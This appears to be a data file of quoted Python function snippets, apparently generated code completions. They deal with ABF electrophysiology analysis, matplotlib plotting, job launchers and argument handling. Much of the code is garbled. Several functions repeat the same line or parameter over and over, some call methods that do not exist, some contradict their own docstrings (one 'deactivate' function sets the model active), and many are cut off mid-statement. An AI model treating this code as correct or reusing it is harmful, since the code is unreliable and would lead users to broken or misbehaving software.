        "def show_message(self, message, title=None):\n        \"\"\" use the GUI to pop up a message. \"\"\"\n        if title is None:\n            title = message\n        self.message_label.setText(title)\n        self.message_label.show()\n        self.message_label.setCaretPosition(0)\n        self.message_label.setFocus()",
        "def askYesNo(self, message=None):\n        \"\"\" use the GUI to ask YES or NO. \"\"\"\n        if message is None:\n            message = \"Are you sure?\"\n        if self.ask(message):\n            return True\n        else:\n            return False",
        "def _check_args(args):\n    '''check out the arguments and figure out what to do.'''\n    if args.verbose:\n        print('\\n')\n        print(''.join([' '.join(['%s=%s' % (k, v) for k, v in sorted(args.args.items())])]))\n        print('')\n    if args.verbose:\n        print('\\n')\n        print(''.join([' '.join(['%s=%s' % (k, v) for k, v in sorted(args.kwargs.items())])]))\n        print('')\n    if args.verbose:\n        print('\\n')\n        print(''.join([' '.join(['%s=%s' % (k, v) for k, v in sorted(args.kwargs.items())])]))\n        print('')\n    if args",
        "def get_stats(self):\n        \"\"\"provide all stats on the first AP.\"\"\"\n        if self.stats is None:\n            self.stats = self.get_stats_from_ap(self.first_ap)\n        return self.stats",
        "def average_feature(features, sweep):\n    \"\"\"return average of a feature divided by sweep.\"\"\"\n    if sweep == 0:\n        return features[0]\n    else:\n        return np.average(features, axis=0) / sweep",
        "def monitor_folder(folder):\n    \"\"\"\n    continuously monitor a folder for new abfs and try to analyze them.\n    This is intended to watch only one folder, but can run multiple copies.\n    \"\"\"\n    while True:\n        try:\n            with open(os.path.join(folder, 'abfs.json')) as f:\n                abfs = json.load(f)\n                if not abfs:\n                    continue\n                for abf in abfs:\n                    if not abf.get('status'):\n                        continue\n                    if abf.get('status') == 'running':\n                        continue\n                    if abf.get('status') == 'failed':\n                        continue\n                    if abf.get('status') == 'failed_to_analyze':\n                        continue\n                    if abf.get('status') == 'failed_to_analyze_",
        "def plot_gain(self, gain, title=None, xlabel=None, ylabel=None,\n                  title_fontsize=18, xlabel_fontsize=18, ylabel_fontsize=18,\n                  title_fontweight='bold', ylabel_fontweight='bold',\n                  title_fontfamily='helvetica', xlabel_fontfamily='helvetica',\n                  xlabel_fontsize=18, ylabel_fontsize=18,\n                  xlabel_fontweight='bold', ylabel_fontweight='bold',\n                  xlabel_fontfamily='helvetica',\n                  ylabel_fontfamily='helvetica',\n                  xlabel_fontsize=18, ylabel_fontsize=18,\n                  xlabel_fontweight='bold', ylabel_fontweight='bold',\n                  xlabel_fontfamily='helvetica',\n                  ylabel_fontfamily='helvetica',\n                  xlabel_fontsize",
        "def draw_comment_lines(self, seconds=0):\n        \"\"\"draw vertical lines at comment points. Defaults to seconds.\"\"\"\n        for i in range(self.comment_points):\n            self.draw_line(seconds)",
        "def stamp_bottom(self):\n        \"\"\"stamp the bottom with file info.\"\"\"\n        self.bottom.stamp(self.file_info)\n        self.bottom.stamp(self.file_info_time)",
        "def make_figure(figsize=(8, 8)):\n    \"\"\"\n    makes a new matplotlib figure with default dims and DPI.\n    Also labels it with pA or mV depending on ABF.\n    \"\"\"\n    fig = plt.figure(figsize=figsize)\n    ax = fig.add_subplot(111)\n    ax.set_title('ABF')\n    ax.set_xlabel('pA')\n    ax.set_ylabel('mV')\n    ax.set_title_fontsize(18)\n    ax.set_xlabel_fontsize(18)\n    ax.set_ylabel_fontsize(18)\n    ax.set_title_fontweight('bold')\n    ax.set_title_fontweight('bold')\n    ax.set_title_fontweight('bold')\n    ax.set_title_fontweight('bold')\n   ",
        "def save_figure(fig, fname=True, tag=None, dpi=300):\n    \"\"\"\n    Save the pylab figure somewhere.\n    If fname==False, show it instead.\n    Height force > dpi force\n    if a tag is given instead of a filename, save it alongside the ABF\n    \"\"\"\n    if fname:\n        fig.savefig(fname, dpi=dpi)\n    else:\n        fig.show()",
        "def load_module(self, module_name):\n        \"\"\"if the module is in this path, load it from the local folder.\"\"\"\n        if module_name in self.modules:\n            return self.modules[module_name]\n        else:\n            module_path = os.path.join(self.path, module_name)\n            if os.path.isfile(module_path):\n                return self.load_module_from_file(module_path)\n            else:\n                raise ImportError(\"Module %s not found\" % module_name)",
        "def _update_state(self, task_ids, launch_info):\n        \"\"\"Called to update the state of the iterator.  This methods\n        receives the set of task ids from the previous set of tasks\n        together with the launch information to allow the output\n        values to be parsed using the output_extractor. This data is then\n        used to determine the next desired point in the parameter\n        space by calling the _update_state method.\n        \"\"\"\n        if self.state is None:\n            self.state = self._initial_state\n        self.state.update(self._update_state(task_ids, launch_info))",
        "def _get_dynamic_args(self, dynamic_args):\n        \"\"\"When dynamic, not all argument values may be available.\"\"\"\n        if dynamic_args is None:\n            return []\n        return [arg for arg in dynamic_args if arg is not None]",
        "def _summary(self):\n        \"\"\"\n        Summarizes the trace of values used to update the DynamicArgs\n        and the arguments subsequently returned. May be used to\n        implement the summary method.\n        \"\"\"\n        if self._summary_method is not None:\n            return self._summary_method(self)\n        else:\n            return self._summary_method(self.values)",
        "def _increment_and_decrement(self, value, stepsize):\n        \"\"\"\n        Takes as input a list or tuple of two elements. First the\n        value returned by incrementing by 'stepsize' followed by the\n        value returned after a 'stepsize' decrement.\n        \"\"\"\n        if isinstance(value, (list, tuple)):\n            return self._increment_and_decrement(value[0], stepsize)\n        else:\n            return self._increment(value, stepsize)",
        "def analyze(self, filename):\n        \"\"\"\n        given a filename or ABF object, try to analyze it.\n        \"\"\"\n        if isinstance(filename, ABF):\n            filename = filename.filename\n        if not os.path.exists(filename):\n            raise ValueError(\"File %s does not exist\" % filename)\n        if not os.path.isfile(filename):\n            raise ValueError(\"File %s is not a file\" % filename)\n        if not os.access(filename, os.R_OK):\n            raise ValueError(\"File %s is not readable\" % filename)\n        if not os.access(filename, os.W_OK):\n            raise ValueError(\"File %s is not writable\" % filename)\n        if not os.access(filename, os.X_OK):\n            raise ValueError(\"File %s is not executable\" % filename)\n        if not",
        "def frame_plot(\n    plot,\n    datatype,\n    saveImage=True,\n    title=None,\n    xlabel=None,\n    ylabel=None,\n    title_fontsize=None,\n    ylabel_fontsize=None,\n    xlabel_fontsize=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n    ylabel_fontweight=None,\n    xlabel_fontweight=None,\n",
        "def _figure_ready(self):\n        \"\"\"make sure a figure is ready.\"\"\"\n        if self.figure is None:\n            return\n        if self.figure.is_closed:\n            self.figure.close()\n        self.figure.savefig(self.figure_path)",
        "def save(self, filename):\n        \"\"\"save the existing figure. does not close it.\"\"\"\n        fig = self.figure\n        if fig is None:\n            return\n        fig.savefig(filename)",
        "def plot_sweep(self, filename, **kwargs):\n        \"\"\"plot every sweep of an ABF file.\"\"\"\n        fig, ax = plt.subplots(figsize=(8, 6))\n        ax.set_title('Sweep')\n        ax.set_xlabel('Time (s)')\n        ax.set_ylabel('Frequency (Hz)')\n        ax.set_title_fontsize(18)\n        ax.set_ylabel_fontsize(18)\n        ax.set_xlabel_fontsize(18)\n        ax.set_title_fontsize(18)\n        ax.set_xlabel_fontsize(18)\n        ax.set_title_fontsize(18)\n        ax.set_ylabel_fontsize(18)\n        ax.set_xlabel_fontsize(18)\n        ax.set_ylabel_fontsize(18)\n        ax.set_title_fontsize(",
        "def plot(self):\n        \"\"\"plot the current sweep protocol.\"\"\"\n        plt.figure()\n        plt.plot(self.protocol.sweep_protocol_id,\n                  self.protocol.sweep_protocol_version,\n                  'k-')\n        plt.xlabel('Protocol ID')\n        plt.ylabel('Protocol Version')\n        plt.title('Sweep Protocol')\n        plt.show()",
        "def plot_protocol(self):\n        \"\"\"plot the protocol of all sweeps.\"\"\"\n        plt.figure()\n        plt.plot(self.sweep_protocol_times, self.sweep_protocol_values, 'k-')\n        plt.xlabel('Time')\n        plt.ylabel('Protocol')\n        plt.title('Protocol')\n        plt.show()",
        "def rename_abfs_tifs(abfs, tifs):\n    \"\"\"\n    Given ABFs and TIFs formatted long style, rename each of them to prefix their number with a different number.\n\n    Example: 2017_10_11_0011.abf\n    Becomes: 2017_10_11_?011.abf\n    where ? can be any character.\n    \"\"\"\n    for abf in abfs:\n        tifs[abf] = re.sub(r'_?', '_', tifs[abf])\n    return tifs",
        "def _get_ext_dict(files):\n    \"\"\"given a list of files, return a dict organized by extension.\"\"\"\n    ext_dict = {}\n    for f in files:\n        ext_dict[os.path.splitext(f)[1][1:]] = f\n    return ext_dict",
        "def _get_files_by_cell(files, cells):\n    \"\"\"given files and cells, return a dict of files grouped by cell.\"\"\"\n    files_by_cell = {}\n    for cell in cells:\n        files_by_cell[cell] = files\n    return files_by_cell",
        "def populate_folder_properties(self):\n        \"\"\"populate class properties relating to files in the folder.\"\"\"\n        for f in self.files:\n            self.add_property(f.name, f.path)",
        "def _generate_links(self):\n        \"\"\"\n        generate list of cells with links. keep this simple.\n        automatically generates splash page and regnerates frames.\n        \"\"\"\n        self.frame_counter = 0\n        self.frame_count = 0\n        self.frame_count_max = self.frame_count\n        self.frame_counter_max = self.frame_counter\n        self.frame_counter_min = 0\n        self.frame_counter_min = self.frame_counter\n        self.frame_counter_max = self.frame_counter\n        self.frame_counter_min = 0\n        self.frame_counter_max = self.frame_counter\n        self.frame_counter_min = 0\n        self.frame_counter_min = self.frame_counter\n        self.frame_counter_max = self.frame_counter\n       ",
        "def generate_data_view(self):\n        \"\"\"generate a data view for every ABF in the project folder.\"\"\"\n        for abf in self.project_folder.list_files():\n            if abf.endswith('.abf'):\n                self.generate_data_view_for_file(abf)",
        "def _hyperpolarization_step(self, tau, stuff):\n        \"\"\"hyperpolarization step. Use to calculate tau and stuff.\"\"\"\n        tau_new = tau + self.tau_step\n        stuff_new = stuff + self.stuff_step\n        return tau_new, stuff_new",
        "def _ic_steps(self, x, y, step):\n        \"\"\"IC steps. Use to determine gain function.\"\"\"\n        if step == 0:\n            return 0.0\n        if step == 1:\n            return 1.0\n        if step == 2:\n            return 2.0\n        if step == 3:\n            return 3.0\n        if step == 4:\n            return 4.0\n        if step == 5:\n            return 5.0\n        if step == 6:\n            return 6.0\n        if step == 7:\n            return 7.0\n        if step == 8:\n            return 8.0\n        if step == 9:\n            return 9.0\n        if step == 10:\n            return 10.0\n        if step == 11:\n            return 11.0\n        if step == 12:\n            return 12.0\n        if",
        "def step(self, x, y, step_size=1.0):\n        \"\"\"IC steps. See how hyperpol. step affects things.\"\"\"\n        x = np.asarray(x)\n        y = np.asarray(y)\n        if self.is_training:\n            x = self.model.predict(x)\n            y = self.model.predict(y)\n        return x, y, step_size",
        "def membrane_repeated(self, n):\n        \"\"\"repeated membrane tests.\"\"\"\n        for _ in range(n):\n            self.membrane()",
        "def fast_sweep(self, iv, sweep_length=1):\n        \"\"\"fast sweeps, 1 step per sweep, for clean IV without fast currents.\"\"\"\n        iv = self.clean_iv(iv)\n        sweep_length = self.sweep_length(sweep_length)\n        sweep_length = sweep_length / 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2\n        sweep_length = sweep_length * 2",
        "def membrane_test(self, x, y, z, n_iter=1000, **kwargs):\n        \"\"\"\n        repeated membrane tests, likely with drug added. Maybe IPSCs.\n        \"\"\"\n        if self.membrane_type == 'drug':\n            return self.drug_membrane_test(x, y, z, n_iter, **kwargs)\n        elif self.membrane_type == 'ipsc':\n            return self.ipsc_membrane_test(x, y, z, n_iter, **kwargs)\n        else:\n            raise ValueError(\"Unknown membrane type: %s\" % self.membrane_type)",
        "def _membrane_step(self, X, y, test_size, test_idx,\n                      num_iterations, random_state):\n        \"\"\"combination of membrane test and IV steps.\"\"\"\n        # membrane test\n        if test_idx == 0:\n            return self._membrane_test(X, y, test_size, random_state)\n        # IV\n        else:\n            return self._membrane_iv(X, y, test_size, test_idx,\n                                    num_iterations, random_state)",
        "def index_folder(self, folder_name):\n        \"\"\"OBSOLETE WAY TO INDEX A FOLDER.\"\"\"\n        self.log.info(\"Indexing folder: %s\", folder_name)\n        self.client.index_folder(folder_name)",
        "def save(self, *args, **kwargs):\n        \"\"\"A custom save method that handles figuring out when something is activated or deactivated.\"\"\"\n        if self.is_active:\n            self.is_active = False\n            self.save_activation_status()\n        super(Activation, self).save(*args, **kwargs)",
        "def deactivate_model(self, model, force=False):\n        \"\"\"\n        It is impossible to delete an activatable model unless force is True. This function instead sets it to inactive.\n        \"\"\"\n        if force:\n            self.set_model_status(model, self.ACTIVE)\n        else:\n            self.set_model_status(model, self.INACTIVE)",
        "def write_to_file(self, file_handle=None):\n        \"\"\"Write to file_handle if supplied, othewise print output\"\"\"\n        if file_handle is None:\n            print(self.output)\n        else:\n            file_handle.write(self.output)",
        "def _root_dir_name(self, timestamp):\n        \"\"\"\n        A helper method that supplies the root directory name given a\n        timestamp.\n        \"\"\"\n        return os.path.join(self.root_dir, timestamp)",
        "def _parse_launch_specifications(self, log):\n        \"\"\"The log contains the tids and corresponding specifications\n        used during launch with the specifications in JSON format.\n        \"\"\"\n        launch_specifications = {}\n        for spec in log:\n            tids = spec.get('tids')\n            if tids:\n                launch_specifications[tids[0]] = spec.get('specifications')\n        return launch_specifications",
        "def _write_info_file(self, setup_info):\n        \"\"\"\n        All launchers should call this method to write the info file\n        at the end of the launch. The .info file is saved given\n        setup_info supplied by _setup_launch into the\n        root_directory. When called without setup_info, the existing\n        info file is updated with the end-time.\n        \"\"\"\n        if setup_info:\n            self.info_file = os.path.join(self.root_directory, '.info')\n            with open(self.info_file, 'w') as f:\n                f.write(setup_info)\n        else:\n            self.info_file = os.path.join(self.root_directory, '.info')",
        "def _launch_processes(self, process_commands):\n        \"\"\"Launches processes defined by process_commands, but only\n        executes max_concurrency processes at a time; if a process\n        completes and there are still outstanding processes to be\n        executed, the next processes are run until max_concurrency is\n        reached again.\n        \"\"\"\n        for process_command in process_commands:\n            self._launch_process(process_command)\n            if self._process_count >= self._max_concurrency:\n                self._run_processes()",
        "def summary(self):\n        \"\"\"\n        A succinct summary of the Launcher configuration.  Unlike the\n        repr, a summary does not have to be complete but must supply\n        key information relevant to the user.\n        \"\"\"\n        return {\n            'name': self.name,\n            'version': self.version,\n            'launcher_type': self.launcher_type,\n            'launcher_version': self.launcher_version,\n            'launcher_type_version': self.launcher_type_version,\n            'launcher_type_name': self.launcher_type_name,\n            'launcher_version_name': self.launcher_version_name,\n            'launcher_type_name_version': self.launcher_type_name_version,\n            'launcher_type_name_name': self.launcher",
        "def run(self):\n        \"\"\"\n        The method that actually runs qsub to invoke the python\n        process with the necessary commands to trigger the next\n        collation step and next block of jobs.\n        \"\"\"\n        self.log.info(\"Running qsub\")\n        self.qsub_process = subprocess.Popen(\n            self.qsub_cmd,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            shell=True,\n        )\n        stdout, stderr = self.qsub_process.communicate()\n        if self.qsub_process.returncode != 0:\n            self.log.error(\"qsub failed with exit code %s\", self.qsub_process.returncode)\n            raise QsubError(stdout)\n        self.log.info(\"qsub finished\")\n        self.log.info(\"Collation finished",
        "def _handle_static_args(self, args):\n        \"\"\"This method handles static argument specifiers and cases where\n        the dynamic specifiers cannot be queued before the arguments\n        are known.\n        \"\"\"\n        if self.dynamic_specifiers:\n            for spec in self.dynamic_specifiers:\n                if spec.is_static:\n                    self.static_args.append(spec)\n        else:\n            self.static_args.append(args)",
        "def _process_commands(self):\n        \"\"\"\n        Aggregates all process_commands and the designated output files into a\n        list, and outputs it as JSON, after which the wrapper script is called.\n        \"\"\"\n        output_files = []\n        for command in self.process_commands:\n            output_files.append(command.output_file)\n        output_files.sort()\n        output_files_json = json.dumps(output_files)\n        self.output_file = output_files_json\n        self.output_file_json = output_files_json",
        "def _check_launchers(self):\n        \"\"\"Performs consistency checks across all the launchers.\"\"\"\n        for launcher in self.launchers:\n            if launcher.name not in self.launchers:\n                raise LauncherError(\n                    \"Launcher '%s' is not registered\" % launcher.name)\n            if launcher.name not in self.launchers_by_id:\n                raise LauncherError(\n                    \"Launcher '%s' is not registered by ID\" % launcher.name)",
        "def launch_launchers(self):\n        \"\"\"Launches all available launchers.\"\"\"\n        for launcher in self.launchers:\n            launcher.launch()",
        "def run_review(self):\n        \"\"\"Runs the review process for all the launchers.\"\"\"\n        for launcher in self.launchers:\n            launcher.run_review()",
        "def _prompt_for_input(self, prompt, default=None):\n        \"\"\"Helper to prompt the user for input on the commandline.\"\"\"\n        if default is None:\n            default = self.default\n        while True:\n            try:\n                return prompt\n            except KeyboardInterrupt:\n                return default",
        "def _check_metadata_data_keys(self):\n        \"\"\"\n        The implementation in the base class simply checks there is no\n        clash between the metadata and data keys.\n        \"\"\"\n        for key in self.metadata:\n            if key in self.data:\n                raise ValueError(\"The metadata key '%s' is already in the data\" % key)",
        "def get_save_path(self, filename):\n        \"\"\"\n        Returns the full path for saving the file, adding an extension\n        and making the filename unique as necessary.\n        \"\"\"\n        path = self.get_save_path_for(filename)\n        if not path:\n            path = self.get_save_path_for(filename + '.tmp')\n        return path",
        "def has_extension(self, filename):\n        \"\"\"\n        Returns a boolean indicating whether the filename has an\n        appropriate extension for this class.\n        \"\"\"\n        if not filename:\n            return False\n        if not filename.endswith(self.extension):\n            return False\n        return True",
        "def _get_data(self, data):\n        \"\"\"Data may be either a PIL Image object or a Numpy array.\"\"\"\n        if isinstance(data, Image.Image):\n            data = data.convert('RGB')\n        elif isinstance(data, np.ndarray):\n            data = data.reshape(data.shape)\n        return data",
        "def get_modified_date(self):\n        \"\"\"return \"YYYY-MM-DD\" when the file was modified.\"\"\"\n        if self.modified_date:\n            return self.modified_date\n        else:\n            return self.get_modified_time()",
        "def get_active_folders(self):\n        \"\"\"\n        returns a dict of active folders with days as keys.\n        \"\"\"\n        active_folders = {}\n        for folder in self.folders:\n            if folder.is_active:\n                active_folders[folder.day] = folder\n        return active_folders",
        "def normal_distribution_curve(data, xs):\n    \"\"\"\n    given some data and a list of X posistions, return the normal\n    distribution curve as a Y point at each of those Xs.\n    \"\"\"\n    # compute the normal distribution curve\n    # the normal distribution curve is the sum of the squared distances\n    # between the two points\n    # the normal distribution curve is the sum of the squared distances\n    # between the two points\n    # the normal distribution curve is the sum of the squared distances\n    # between the two points\n    # the normal distribution curve is the sum of the squared distances\n    # between the two points\n    # the normal distribution curve is the sum of the squared distances\n    # between the two points\n    # the normal distribution curve is the sum of the squared distances\n    # between the two points\n    # the normal distribution curve is the sum of the squared distances\n",
        "def show_info(self):\n        \"\"\"show basic info about ABF class variables.\"\"\"\n        print(\"ABF class variables:\")\n        print(\"  name: %s\" % self.name)\n        print(\"  type: %s\" % self.type)\n        print(\"  size: %s\" % self.size)\n        print(\"  alignment: %s\" % self.alignment)\n        print(\"  alignment_type: %s\" % self.alignment_type)\n        print(\"  alignment_size: %s\" % self.alignment_size)\n        print(\"  alignment_type_size: %s\" % self.alignment_type_size)\n        print(\"  alignment_type_size_type: %s\" % self.alignment_type_size_type)\n        print(\"  alignment_type_size_type_size: %s\" % self.",
        "def _read_header(self):\n        \"\"\"read the ABF header and save it HTML formatted.\"\"\"\n        self.header = self.file.read(self.header_size)\n        self.header = self.header.decode('utf-8')\n        self.header = self.header.split('<h1>')[0].strip()\n        self.header = self.header.split('</h1>')[0].strip()\n        self.header = self.header.split('<h2>')[0].strip()\n        self.header = self.header.split('</h2>')[0].strip()\n        self.header = self.header.split('<h3>')[0].strip()\n        self.header = self.header.split('</h3>')[0].strip()\n        self.header = self.header.split('<h4>'",
        "def set_cmap(self, cmap):\n        \"\"\"use 1 colormap for the whole abf. You can change it!.\"\"\"\n        self.cmap = cmap\n        self.cmap_rgb = self.cmap.convert_rgb()\n        self.cmap_rgba = self.cmap.convert_rgba()",
        "def timePoint(self, timePint, thisSweep=False):\n        \"\"\"return self.dataY around a time point. All units are seconds.\n        if thisSweep==False, the time point is considered to be experiment time\n            and an appropriate sweep may be selected. i.e., with 10 second\n            sweeps and timePint=35, will select the 5s mark of the third sweep\"\"\"\n        if thisSweep:\n            if timePint == 0:\n                return self.dataY\n            else:\n                return self.dataY[self.timePint-1]\n        else:\n            return self.dataY[timePint]",
        "def filter_trace(self, trace):\n        \"\"\"\n        RETURNS filtered trace. Desn't filter it in place.\n        \"\"\"\n        filtered_trace = []\n        for i, line in enumerate(trace):\n            if line.startswith(self.trace_prefix):\n                filtered_trace.append(trace[i])\n        return filtered_trace",
        "def validate_activatable_model_fields(model):\n    \"\"\"\n    Raises a ValidationError for any ActivatableModel that has ForeignKeys or OneToOneFields that will\n    cause cascading deletions to occur. This function also raises a ValidationError if the activatable\n    model has not defined a Boolean field with the field name defined by the ACTIVATABLE_FIELD_NAME variable\n    on the model.\n    \"\"\"\n    for field in model._meta.fields:\n        if field.name == ACTIVATABLE_FIELD_NAME:\n            if field.many:\n                raise ValidationError(\n                    \"The ActivatableModel '{}' has a Boolean field with the name '{}' that is \"\n                    \"not defined as a Many-to-One field.\".format(\n                        model.__name__,\n                        ACTIVATABLE_FIELD_NAME\n                    )\n                )\n            else:\n                raise ValidationError(\n                    \"",
        "def _args_to_table(args):\n    \"\"\"Helper function to convet an Args object to a HoloViews Table\"\"\"\n    table = Table(args.name, args.columns, args.data)\n    for i, row in enumerate(args.data):\n        table.row(row)\n    return table",
        "def _get_args_and_kwargs(self, args, kwargs):\n        \"\"\"Method to define the positional arguments and keyword order\n        for pretty printing.\n        \"\"\"\n        args_and_kwargs = []\n        for arg in args:\n            if isinstance(arg, str):\n                arg = arg.split('.')\n            if arg:\n                args_and_kwargs.append(arg)\n        return args_and_kwargs, kwargs",
        "def format_args(args):\n    \"\"\"Formats the elements of an argument set appropriately\"\"\"\n    if args is None:\n        return []\n    if isinstance(args, (list, tuple)):\n        return [format_args(x) for x in args]\n    if isinstance(args, dict):\n        return {k: format_args(v) for k, v in args.items()}\n    return [format_args(x) for x in args]",
        "def collapse_keys(self):\n        \"\"\"\n        Returns a dictionary like object with the lists of values\n        collapsed by their respective key. Useful to find varying vs\n        constant keys and to find how fast keys vary.\n        \"\"\"\n        return {k: v for k, v in self.items() if k not in self.collapsed}",
        "def summary(self):\n        \"\"\"\n        A succinct summary of the argument specifier. Unlike the repr,\n        a summary does not have to be complete but must supply the\n        most relevant information about the object to the user.\n        \"\"\"\n        if self.is_optional:\n            return \"optional\"\n        if self.is_required:\n            return \"required\"\n        if self.is_varargs:\n            return \"varargs\"\n        if self.is_varkw:\n            return \"varkw\"\n        if self.is_varkw_optional:\n            return \"varkw optional\"\n        if self.is_varkw_required:\n            return \"varkw required\"\n        if self.is_varkw_varargs:\n            return \"varkw varargs\"\n        if self.is_varkw_vark",
        "def _get_specs(self, **kwargs):\n        \"\"\"\n        Returns the specs, the remaining kwargs and whether or not the\n        constructor was called with kwarg or explicit specs.\n        \"\"\"\n        specs = self._specs\n        if specs is None:\n            specs = self._kwargs\n        if specs is None:\n            specs = self._explicit_specs\n        if specs is None:\n            specs = self._explicit_specs + self._kwargs\n        return specs",
        "def inspect_args(self, exclude=None):\n        \"\"\"Convenience method to inspect the available argument values in\n        human-readable format. The ordering of keys is determined by\n        how quickly they vary.\n\n        The exclude list allows specific keys to be excluded for\n        readability (e.g. to hide long, absolute filenames).\n        \"\"\"\n        if exclude is None:\n            exclude = []\n        return {k: v for k, v in self.args.items() if k not in exclude}",
        "def sort(self, *args):\n        \"\"\"\n        The lexical sort order is specified by a list of string\n        arguments. Each string is a key name prefixed by '+' or '-'\n        for ascending and descending sort respectively. If the key is\n        not found in the operand's set of varying keys, it is ignored.\n        \"\"\"\n        if len(args) == 0:\n            return self\n        if len(args) == 1:\n            return self.sort_by(args[0])\n        if len(args) == 2:\n            return self.sort_by(args[0], args[1])\n        raise ValueError(\"Invalid sort order: %r\" % args)",
        "def linspace(start, stop, num):\n    \"\"\"Simple replacement for numpy linspace\"\"\"\n    return np.linspace(start, stop, num)",
        "def parse_log(self, log_file):\n        \"\"\"\n        Parses the log file generated by a launcher and returns\n        dictionary with tid keys and specification values.\n\n        Ordering can be maintained by setting dict_type to the\n        appropriate constructor (i.e. OrderedDict). Keys are converted\n        from unicode to strings for kwarg use.\n        \"\"\"\n        log_dict = {}\n        for line in log_file:\n            line = line.strip()\n            if not line:\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('",
        "def write(self, *specs, **kwargs):\n        \"\"\"\n        Writes the supplied specifications to the log path. The data\n        may be supplied as either as a an Args or as a list of\n        dictionaries.\n\n        By default, specifications will be appropriately appended to\n        an existing log file. This can be disabled by setting\n        allow_append to False.\n        \"\"\"\n        if not specs:\n            return\n        if not self.allow_append:\n            raise ValueError(\"Cannot write to an empty log file\")\n        if not self.log_path:\n            raise ValueError(\"Cannot write to an empty log file\")\n        if not self.log_file:\n            raise ValueError(\"Cannot write to an empty log file\")\n        if not self.log_file.closed:\n            self.log_file.close()\n        if not self.log_file.open(self.log",
        "def load_files(self, directory, extension=None, **kwargs):\n        \"\"\"\n        Load all the files in a given directory selecting only files\n        with the given extension if specified. The given kwargs are\n        passed through to the normal constructor.\n        \"\"\"\n        if extension is None:\n            extension = self.extension\n        return self.load_files_in_directory(directory, extension, **kwargs)",
        "def _get_fields(self, pattern):\n        \"\"\"Return the fields specified in the pattern using Python's\n        formatting mini-language.\n        \"\"\"\n        fields = []\n        for field in pattern:\n            if isinstance(field, str):\n                fields.append(field)\n            elif isinstance(field, (list, tuple)):\n                fields.extend(field)\n            else:\n                raise TypeError(\"Invalid field: %s\" % field)\n        return fields",
        "def load_files(self, pattern):\n        \"\"\"Loads the files that match the given pattern.\"\"\"\n        for root, dirs, files in os.walk(pattern):\n            for filename in files:\n                self.load_file(os.path.join(root, filename))",
        "def _find_paths(self, pattern):\n        \"\"\"\n        From the pattern decomposition, finds the absolute paths\n        matching the pattern.\n        \"\"\"\n        paths = []\n        for path in self.paths:\n            if pattern.match(path):\n                paths.append(path)\n        return paths",
        "def chain(self, pattern, filetype=None):\n        \"\"\"Convenience method to directly chain a pattern processed by\n        FilePattern into a FileInfo instance.\n\n        Note that if a default filetype has been set on FileInfo, the\n        filetype argument may be omitted.\n        \"\"\"\n        return FileInfo(self, pattern, filetype=filetype)",
        "def load_file(self, table, key, filetype, data_key=None):\n        \"\"\"\n        Load the file contents into the supplied Table using the\n        specified key and filetype. The input table should have the\n        filenames as values which will be replaced by the loaded\n        data. If data_key is specified, this key will be used to index\n        the loaded data to retrive the specified item.\n        \"\"\"\n        if data_key is None:\n            data_key = key\n        for row in self.get_rows(key, filetype):\n            if data_key in row:\n                table.set_value(row[data_key], row[key])\n            else:\n                raise KeyError(\"No data found for key %s\" % key)",
        "def load_file(self, key, filetype, df):\n        \"\"\"\n        Load the file contents into the supplied dataframe using the\n        specified key and filetype.\n        \"\"\"\n        if filetype == 'csv':\n            df = pd.read_csv(self.path, sep=',', header=None,\n                            names=key, index_col=0)\n        elif filetype == 'json':\n            df = pd.read_json(self.path, sep=',', header=None,\n                            names=key, index_col=0)\n        else:\n            raise ValueError('Unsupported filetype: %s' % filetype)\n        return df",
        "def _generate_source_specs(self):\n        \"\"\"\n        Generates the union of the source.specs and the metadata\n        dictionary loaded by the filetype object.\n        \"\"\"\n        source_specs = self.source_specs\n        metadata = self.metadata\n        if source_specs is None:\n            return\n        if metadata is None:\n            return\n        for source_spec in source_specs:\n            if source_spec.name in metadata:\n                metadata[source_spec.name] = source_spec.value\n            else:\n                metadata[source_spec.name] = source_spec.value",
        "def push(self, data):\n        \"\"\"Push new data into the buffer. Resume looping if paused.\"\"\"\n        if self.paused:\n            return\n        self.buffer.append(data)\n        if len(self.buffer) > self.buffer_size:\n            self.buffer = self.buffer[:self.buffer_size]",
        "def plot_sweep_area(self, sweep, ax=None):\n        \"\"\"Create a plot of one area of interest of a single sweep.\"\"\"\n        if ax is None:\n            ax = plt.gca()\n        ax.plot(sweep.area, sweep.area_interest, label='Area of Interest')",
        "def analyze_folder(folder):\n    \"\"\"Inelegant for now, but lets you manually analyze every ABF in a folder.\"\"\"\n    for root, dirs, files in os.walk(folder):\n        for f in files:\n            if f.endswith('.abf'):\n                print('Analyzing %s' % f)\n                analyze_file(os.path.join(root, f))",
        "def reanalyze_single_abf(self, abf_id):\n        \"\"\"Reanalyze data for a single ABF. Also remakes child and parent html.\"\"\"\n        abf = self.get_abf(abf_id)\n        self.reanalyze_single_abf_child(abf)\n        self.reanalyze_single_abf_parent(abf)",
        "def _get_files_in_folders(self, folder1, folder2):\n        \"\"\"\n        scan folder1 and folder2 into files1 and files2.\n        since we are on windows, simplify things by making them all lowercase.\n        this WILL cause problems on 'nix operating systems.If this is the case,\n        just run a script to rename every file to all lowercase.\n        \"\"\"\n        files1 = []\n        files2 = []\n        for root, dirs, files in os.walk(folder1):\n            for f in files:\n                if f.endswith('.py'):\n                    files1.append(os.path.join(root, f))\n                elif f.endswith('.pyw'):\n                    files2.append(os.path.join(root, f))\n        return files1, files2",
        "def convert_folder(self, folder1, folder2):\n        \"\"\"\n        run this to turn all folder1 TIFs and JPGs into folder2 data.\n        TIFs will be treated as micrographs and converted to JPG with enhanced\n        contrast. JPGs will simply be copied over.\n        \"\"\"\n        for tif in self.tifs:\n            self.convert_tif(tif, folder1, folder2)",
